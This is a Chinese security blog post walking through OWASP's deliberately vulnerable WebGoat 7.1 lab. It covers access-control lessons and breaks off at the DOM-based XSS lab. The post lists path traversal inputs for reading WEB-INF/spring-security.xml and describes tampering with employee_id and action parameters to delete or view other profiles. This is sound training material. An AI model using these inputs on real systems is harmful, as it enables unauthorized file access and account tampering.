

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, ÂçöÂÆ¢, ‰ø°ÊÅØÂÆâÂÖ®">
  
    <meta name="description" content="WebGoat ÊòØ OWASP ÁªÑÁªáÁ†îÂà∂Âá∫ÁöÑÁî®‰∫éËøõË°å web ÊºèÊ¥ûÂÆûÈ™åÁöÑÂ∫îÁî®Âπ≥Âè∞„ÄÇËá™Â∑±Êê≠‰∫Ü‰∏Ä‰∏™Èù∂Âú∫ÁªÉ‰π†‰∫Ü‰∏Ä‰∏ãÔºåËøôÁØáÊòØÊàëÁöÑÁªÉ‰π†ËÆ∞ÂΩïÔºàÈÉ®ÂàÜÈ¢òÊÑèÁøªËØë">
<meta property="og:type" content="article">
<meta property="og:title" content="WebGoat Èù∂Âú∫È¢òËß£">
<meta property="og:url" content="https://www.tr0y.wang/2018/04/06/WebGoat/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="WebGoat ÊòØ OWASP ÁªÑÁªáÁ†îÂà∂Âá∫ÁöÑÁî®‰∫éËøõË°å web ÊºèÊ¥ûÂÆûÈ™åÁöÑÂ∫îÁî®Âπ≥Âè∞„ÄÇËá™Â∑±Êê≠‰∫Ü‰∏Ä‰∏™Èù∂Âú∫ÁªÉ‰π†‰∫Ü‰∏Ä‰∏ãÔºåËøôÁØáÊòØÊàëÁöÑÁªÉ‰π†ËÆ∞ÂΩïÔºàÈÉ®ÂàÜÈ¢òÊÑèÁøªËØë">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
<meta property="article:published_time" content="2018-04-06T11:09:36.000Z">
<meta property="article:modified_time" content="2021-04-13T09:32:35.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Èù∂Âú∫">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
  
  
  
  <title>WebGoat Èù∂Âú∫È¢òËß£ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"‰∏®","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"üåß"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                È¶ñÈ°µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ÁîüÂëΩÁ∫ø
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Ê†áÁ≠æ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                ÂàÜÁ±ª
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                ÊëÑÂΩ±ÈõÜ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                ÂÖ≥‰∫é
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="WebGoat Èù∂Âú∫È¢òËß£"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2018-04-06 11:09" pubdate>
          2018Âπ¥4Êúà6Êó• 11:09:36
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          25k Â≠ó
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          155 ÂàÜÈíü
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ËøáÁ®ãËÆ∞ÂΩï"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="true"
      >
        ËøáÁ®ãËÆ∞ÂΩï
        <span class="list-group-count">(30)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2017/10/31/RSA2016/" title="2016 ÂÖ®ÂõΩÈ´òÊ†°ÂØÜÁ†ÅÊï∞Â≠¶ÊåëÊàòËµõ-ËµõÈ¢ò‰∏â"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2016 ÂÖ®ÂõΩÈ´òÊ†°ÂØÜÁ†ÅÊï∞Â≠¶ÊåëÊàòËµõ-ËµõÈ¢ò‰∏â</span>
        </a>
      
    
      
      
        <a href="/2020/05/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E8%B5%9B%E5%90%8E%E6%84%9F%E8%A8%80/" title="2020 ÁΩëÈºéÊùØËµõÔºàziÔºâÂêéÔºàbiÔºâÊÑüË®Ä"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2020 ÁΩëÈºéÊùØËµõÔºàziÔºâÂêéÔºàbiÔºâÊÑüË®Ä</span>
        </a>
      
    
      
      
        <a href="/2017/10/12/CBCByteFlippingAttack/" title="CBC Â≠óËäÇÁøªËΩ¨ÊîªÂáª"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CBC Â≠óËäÇÁøªËΩ¨ÊîªÂáª</span>
        </a>
      
    
      
      
        <a href="/2018/04/29/CVE-2016-3714/" title="CVE-2016-3714 ImageTragick"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CVE-2016-3714 ImageTragick</span>
        </a>
      
    
      
      
        <a href="/2018/05/18/CVE-2018-1111/" title="CVE-2018-1111 DynoRoot"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CVE-2018-1111 DynoRoot</span>
        </a>
      
    
      
      
        <a href="/2020/08/07/CVE-2020-15778/" title="CVE-2020-15778ÔºöÈ∏°ËÇãÁöÑÈ´òÂç±"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CVE-2020-15778ÔºöÈ∏°ËÇãÁöÑÈ´òÂç±</span>
        </a>
      
    
      
      
        <a href="/2017/10/11/crypto-course-week1/" title="Coursera ‰∏äÂØÜÁ†ÅÂ≠¶ÂÖ¨ÂºÄËØæÁöÑ week1"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">Coursera ‰∏äÂØÜÁ†ÅÂ≠¶ÂÖ¨ÂºÄËØæÁöÑ week1</span>
        </a>
      
    
      
      
        <a href="/2017/12/05/EX6a/" title="Cryptopals Challenge 43"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">Cryptopals Challenge 43</span>
        </a>
      
    
      
      
        <a href="/2017/12/05/EX6b/" title="Cryptopals Challenge 44"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">Cryptopals Challenge 44</span>
        </a>
      
    
      
      
        <a href="/2018/04/26/Discuz-v3-4-delete/" title="Discuz!(v3.4 Âèä‰ª•‰∏ã) ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥ûÂàÜÊûê"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">Discuz!(v3.4 Âèä‰ª•‰∏ã) ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÊºèÊ¥ûÂàÜÊûê</span>
        </a>
      
    
      
      
        <a href="/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">WebGoat Èù∂Âú∫È¢òËß£</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö4 Âπ¥Ââç
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>WebGoat ÊòØ OWASP ÁªÑÁªáÁ†îÂà∂Âá∫ÁöÑÁî®‰∫éËøõË°å web ÊºèÊ¥ûÂÆûÈ™åÁöÑÂ∫îÁî®Âπ≥Âè∞„ÄÇËá™Â∑±Êê≠‰∫Ü‰∏Ä‰∏™Èù∂Âú∫ÁªÉ‰π†‰∫Ü‰∏Ä‰∏ãÔºåËøôÁØáÊòØÊàëÁöÑÁªÉ‰π†ËÆ∞ÂΩïÔºàÈÉ®ÂàÜÈ¢òÊÑèÁøªËØë</p>
<span id="more"></span>
<h1 id="webgoat-Áõ∏ÂÖ≥">WebGoat Áõ∏ÂÖ≥</h1>
<h2 id="‰ªãÁªç">‰ªãÁªç</h2>
<p>WebGoat ÊòØ OWASP ÁªÑÁªáÁ†îÂà∂Âá∫ÁöÑÁî®‰∫éËøõË°å web ÊºèÊ¥ûÂÆûÈ™åÁöÑÂ∫îÁî®Âπ≥Âè∞ÔºåÁî®Êù•ËØ¥Êòé web Â∫îÁî®‰∏≠Â≠òÂú®ÁöÑÂÆâÂÖ®ÊºèÊ¥û„ÄÇWebGoat ËøêË°åÂú®Â∏¶Êúâ java ËôöÊãüÊú∫ÁöÑÂπ≥Âè∞‰πã‰∏äÔºåÂΩìÂâçÊèê‰æõÁöÑËÆ≠ÁªÉËØæÁ®ãÊúâ 30 Â§ö‰∏™ÔºåÂÖ∂‰∏≠ÂåÖÊã¨ÔºöË∑®Á´ôÁÇπËÑöÊú¨ÊîªÂáªÔºàXSSÔºâ„ÄÅËÆøÈóÆÊéßÂà∂„ÄÅÁ∫øÁ®ãÂÆâÂÖ®„ÄÅÊìç‰ΩúÈöêËóèÂ≠óÊÆµ„ÄÅÊìçÁ∫µÂèÇÊï∞„ÄÅÂº±‰ºöËØù cookie„ÄÅSQL Áõ≤Ê≥®„ÄÅÊï∞Â≠óÂûã SQL Ê≥®ÂÖ•„ÄÅÂ≠óÁ¨¶‰∏≤Âûã SQL Ê≥®ÂÖ•„ÄÅweb ÊúçÂä°„ÄÅOpen Authentication Â§±Êïà„ÄÅÂç±Èô©ÁöÑ HTML Ê≥®ÈáäÁ≠âÁ≠â„ÄÇWebGoat Êèê‰æõ‰∫Ü‰∏ÄÁ≥ªÂàó web ÂÆâÂÖ®Â≠¶‰π†ÁöÑÊïôÁ®ãÔºåÊüê‰∫õËØæÁ®ã‰πüÁªôÂá∫‰∫ÜËßÜÈ¢ëÊºîÁ§∫ÔºåÊåáÂØºÁî®Êà∑Âà©Áî®Ëøô‰∫õÊºèÊ¥ûËøõË°åÊîªÂáª„ÄÇ</p>
<h2 id="ÂÆâË£Ö">ÂÆâË£Ö</h2>
<p>ÊàëÁî®ÁöÑÊòØ javaÔºåÁî® docker ‰πüÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ</p>
<p>Áé∞Âú®Â∑≤ÁªèÂá∫‰∫Ü 8.0 ÁâàÁöÑÔºå‰∏çËøáË≤å‰ºº‰∏çÂ§™ÂÆåÂñÑÔºåÊâÄ‰ª•ÊàëÁî®ÁöÑËøòÊòØ 7.1 Áâà„ÄÇ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases?after=v8.0.0.M4">‰∏ãËΩΩ webgoat-container-7.1-exec.jar</a></p>
<p>ÁÑ∂ÂêéÁõ¥Êé•ËøêË°å</p>
<p><code>sudo java -jar webgoat-server-&lt;&lt;version&gt;&gt;.jar</code></p>
<p>ÂΩìÁÑ∂Ôºå‰Ω†‰πüÂèØ‰ª•‰øÆÊîπÂú∞ÂùÄ‰∏éÁ´ØÂè£ÔºàÈªòËÆ§ÊòØ 127.0.0.1:8080</p>
<p><code>sudo java -jar webgoat-server-&lt;&lt;version&gt;&gt;.jar --server.port=9090 --server.address=x.x.x.x</code></p>
<h1 id="ÂÖ≥Âç°">ÂÖ≥Âç°</h1>
<h2 id="introduction">Introduction</h2>
<h3 id="how-to-work-with-webgoat">How to work with WebGoat</h3>
<p>‰∏Ä‰∫õ‰ªãÁªçÊÄßÁöÑÂÜÖÂÆπÔºåÁÆÄÂçïÁúãÁúãÂç≥ÂèØ</p>
<h3 id="how-to-create-a-legacy-lesson">How to create a Legacy Lesson</h3>
<p>‰∏Ä‰∫õ‰ªãÁªçÊÄßÁöÑÂÜÖÂÆπÔºåÁÆÄÂçïÁúãÁúãÂç≥ÂèØ</p>
<h2 id="general">General</h2>
<h3 id="http-basics">Http Basics</h3>
<p>http ÁöÑÁÆÄÂçïÊºîÁ§∫ÔºåÈöè‰æøËæìÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÁÇπÂáª <code>Go</code> ÂèëÁªôÊúçÂä°Âô®ÔºåÊúçÂä°Âô®‰ºöËøîÂõûÈÄÜÂ∫èÁöÑÂ≠óÁ¨¶‰∏≤</p>
<h2 id="access-control-flaws">Access Control Flaws</h2>
<h3 id="using-an-access-control-matrix">Using an Access Control Matrix</h3>
<p>‰ΩøÁî®ËÆøÈóÆÊéßÂà∂Áü©Èòµ„ÄÇÂú®Âü∫‰∫éËßíËâ≤ÁöÑËÆøÈóÆÊéßÂà∂ÊñπÊ°à‰∏≠ÔºåËßíËâ≤Ë°®Á§∫‰∏ÄÁªÑËÆøÈóÆÊùÉÈôêÂíåÊùÉÈôê„ÄÇÁî®Êà∑ÂèØ‰ª•Ë¢´ÂàÜÈÖç‰∏Ä‰∏™ÊàñÂ§ö‰∏™ËßíËâ≤„ÄÇÂü∫‰∫éËßíËâ≤ÁöÑËÆøÈóÆÊéßÂà∂ÊñπÊ°àÈÄöÂ∏∏Áî±ËßíËâ≤ÊùÉÈôêÁÆ°ÁêÜÂíåËßíËâ≤ÂàÜÈÖç‰∏§ÈÉ®ÂàÜÁªÑÊàê„ÄÇÂü∫‰∫éËßíËâ≤ÁöÑËÆøÈóÆÊéßÂà∂ÊñπÊ°àÂèØËÉΩÂÖÅËÆ∏Áî®Êà∑ÊâßË°å‰ªñ/Â•πÂàÜÈÖçÁöÑËßíËâ≤‰∏çÂÖÅËÆ∏ÁöÑËÆøÈóÆÔºåÊàñ‰ª•ÊüêÁßçÊñπÂºèÂÖÅËÆ∏ÂêëÊú™ÊéàÊùÉËßíËâ≤ÊèêÂçáÊùÉÈôê„ÄÇ</p>
<p>ÊØè‰∏™Áî®Êà∑ÈÉΩÊòØÂÖÅËÆ∏ËÆøÈóÆÊüê‰∫õËµÑÊ∫êÁöÑËßíËâ≤ÁöÑÊàêÂëò„ÄÇÊÇ®ÁöÑÁõÆÊ†áÊòØ<strong>Êé¢Á¥¢ÁÆ°ÁêÜÊ≠§ÁΩëÁ´ôÁöÑËÆøÈóÆÊéßÂà∂ËßÑÂàô„ÄÇ</strong>Âè™Êúâ[Admin]ÁªÑÊâçËÉΩËÆøÈóÆ‚ÄúAccount Manager‚ÄùËµÑÊ∫ê„ÄÇ</p>
<p>‰∏Ä‰∏™‰∏Ä‰∏™ËØïÂ∞±Â•Ω‰∫ÜÔºåLarry ÂèØ‰ª•ËÆøÈóÆ <code>Account Manager</code></p>
<h3 id="bypass-a-path-based-access-control-scheme">Bypass a Path Based Access Control Scheme</h3>
<p>ÁªïËøáË∑ØÂæÑËÆøÈóÆÊéßÂà∂ÊñπÊ°à</p>
<p><code>webgoat</code> Áî®Êà∑ÂèØ‰ª•ËÆøÈóÆ <code>lessonPlans/en</code> ÁõÆÂΩï‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂„ÄÇ Â∞ùËØïÁ†¥ÂùèËÆøÈóÆÊéßÂà∂Êú∫Âà∂Âπ∂ËÆøÈóÆ‰∏çÂú®ÂàóÂá∫ÁöÑÁõÆÂΩï‰∏≠ÁöÑËµÑÊ∫ê„ÄÇ ÈÄâÊã©Ë¶ÅÊü•ÁúãÁöÑÊñá‰ª∂ÂêéÔºåWebGoat Â∞ÜÊä•ÂëäÊòØÂê¶Êéà‰∫àÂØπÊñá‰ª∂ÁöÑËÆøÈóÆÊùÉÈôê„ÄÇ Â∞ùËØïËé∑ÂèñÁöÑÊúâË∂£Êñá‰ª∂ÂèØËÉΩÊòØÂÉè <code>WEB-INF/spring-security.xml</code> ËøôÊ†∑ÁöÑÊñá‰ª∂„ÄÇ ËØ∑ËÆ∞‰ΩèÔºåÊñá‰ª∂Ë∑ØÂæÑÂ∞ÜÊ†πÊçÆ WebGoat ÁöÑÂêØÂä®ÊñπÂºèËÄåÊúâÊâÄ‰∏çÂêå„ÄÇ</p>
<p>Áé∞Âú®Êàë‰ª¨Ë¶ÅËé∑Âèñ WEB-INF/spring-security.xml Êñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇËÄå <code>../</code> ‰ª£Ë°®‰∏ä‰∏ÄÁ∫ßÁõÆÂΩïÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄêÁ∫ßÂæÄ‰∏äÊâæÔºö</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>spring-security.xml<br><span class="hljs-keyword">File</span>=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>WEB-INF/spring-security.xml<br></code></pre></td></tr></table></figure>
<p>Ôºàwebgoat Êé®Ëçê‰ΩøÁî® ZAPÔºå‰ΩÜÊòØÊàëÊõ¥ÂñúÊ¨¢ burpsuit</p>
<h3 id="lab-role-based-access-control">LAB: Role Based Access Control</h3>
<h4 id="stage-1">Stage 1</h4>
<p>‰Ωú‰∏∫ÊôÆÈÄöÂëòÂ∑•‚Äútom‚ÄùÔºåÂà©Áî®Âº±ËÆøÈóÆÊéßÂà∂Êù•‰ΩøÁî®‚ÄúËÅåÂëòÂàóË°®‚ÄùÈ°µÈù¢‰∏≠ÁöÑ‚ÄúÂà†Èô§‚ÄùÂäüËÉΩ„ÄÇÈ™åËØÅÂèØ‰ª•Âà†Èô§Ê±§ÂßÜÁöÑ‰∏™‰∫∫ËµÑÊñô„ÄÇÁî®Êà∑ÁöÑÂØÜÁ†ÅÊòØÂ∞èÂÜôÁöÑÁªôÂÆöÂêçÁß∞Ôºà‰æãÂ¶Ç Tom Cat ÁöÑÂØÜÁ†ÅÊòØ‚Äútom‚ÄùÔºâ„ÄÇ</p>
<p>Êú¨Êù•‰ª•‰∏∫ÂØÜÁ†ÅÈÉΩÊòØÂ∞èÂÜôÁöÑÁî®Êà∑ÂêçÔºåÁõ¥Êé•ÁôªÈôÜ admin ÁöÑÂ∏êÂè∑ÔºåÂà†Èô§ Tom ÁöÑÂ∏êÂè∑Âç≥ÂèØÔºåÊ≤°ÊÉ≥Âà∞Ëøá‰∏ç‰∫Ü„ÄÇ„ÄÇÈ¢òÁõÆÂ∫îËØ•ÊåáÁöÑÊòØÔºåTom Ëá™Â∑±Âà†ÊéâËá™Â∑±ÁöÑÁî®Êà∑ÔºàÂè™ËÉΩÁôªÈôÜËá™Â∑±ÁöÑÂ∏êÂè∑</p>
<p>Êäì‰∏Ä‰∏ãÂà†Èô§ÁöÑÂåÖÂèØÁü•ÔºåPost ‰∏∫ <code>employee_id=105&amp;action=DeleteProfile</code></p>
<p>Âú® Tom ÁôªÈôÜÁöÑÊó∂ÂÄôÊîπ‰∏Ä‰∏ã action ÂèÇÊï∞Â∞±Ë°å‰∫Ü</p>
<h4 id="stage-2">Stage 2</h4>
<p>ÂØπ stage1 ÁöÑÊºèÊ¥ûËøõË°å‰øÆË°•„ÄÇÁªôÊÄùË∑ØÂêßÔºö</p>
<p>ÂØπ‰∫é <code>Âà†Èô§</code> ËøôÁßç‰ºöÈÄ†Êàê‰∏•ÈáçÂêéÊûúÁöÑË°å‰∏∫ÔºåÂ∫îËØ•ÂÜçÊ¨°ËæìÂÖ•ÂØÜÁ†Å‰ª•Á°ÆËÆ§ÔºàÂ¶Ç Github</p>
<p>‰ΩÜÊòØË¶ÅÊòØ admin ÁöÑÂ∏êÂè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÔºåÈÇ£‰πüÊ≤°Âï•Â•ΩËØ¥ÁöÑ‰∫Ü</p>
<h4 id="stage-3">Stage 3</h4>
<p>ÁõÆÊ†áÔºö‰Ωú‰∏∫ÊôÆÈÄöÂëòÂ∑•‚Äútom‚ÄùÔºåÂà©Áî®Âº±ËÆøÈóÆÊéßÂà∂Êù•Êü•ÁúãÂÖ∂‰ªñÂëòÂ∑•ÁöÑ‰∏™‰∫∫ËµÑÊñô„ÄÇ</p>
<p>ÁôªÈôÜ Tom ÁöÑÂ∏êÂè∑ÔºåÁÇπÂáª ViewProfiles ÁöÑÊó∂ÂÄôÊäìÂåÖÔºåÊîπ employee_id Âç≥ÂèØ</p>
<h4 id="stage-4">Stage 4</h4>
<p>ÂØπ Stage 3 ÁöÑÊºèÊ¥ûËøõË°å‰øÆË°•</p>
<p>Âä† Cookie</p>
<h2 id="ajax-security">AJAX Security</h2>
<h3 id="lab-dom-based-cross-site-scripting">LAB: DOM-Based cross-site scripting</h3>
<h4 id="stage-1-1">STAGE 1</h4>
<p>ÊñáÊ°£ÂØπË±°Ê®°ÂûãÔºàDOMÔºâ‰ªéÂÆâÂÖ®ÁöÑËßíÂ∫¶ÊèêÂá∫‰∫Ü‰∏Ä‰∏™ÊúâË∂£ÁöÑÈóÆÈ¢ò„ÄÇ ÂÆÉÂÖÅËÆ∏Âä®ÊÄÅ‰øÆÊîπÁΩëÈ°µÁöÑÂÜÖÂÆπÔºå‰ΩÜÊÅ∂ÊÑè‰ª£Á†ÅÊ≥®ÂÖ•ÊúüÈó¥ÂèØËÉΩ‰ºöË¢´ÊîªÂáªËÄÖÊª•Áî®„ÄÇ ÂΩìÊú™ÁªèÈ™åËØÅÁöÑÁî®Êà∑ËæìÂÖ•Áõ¥Êé•Áî®‰∫é‰øÆÊîπÂÆ¢Êà∑Á´ØÈ°µÈù¢ÁöÑÂÜÖÂÆπÊó∂ÔºåXSSÔºà‰∏ÄÁßçÊÅ∂ÊÑè‰ª£Á†ÅÊ≥®ÂÖ•ÔºâÂèØËÉΩÂèëÁîü„ÄÇ</p>
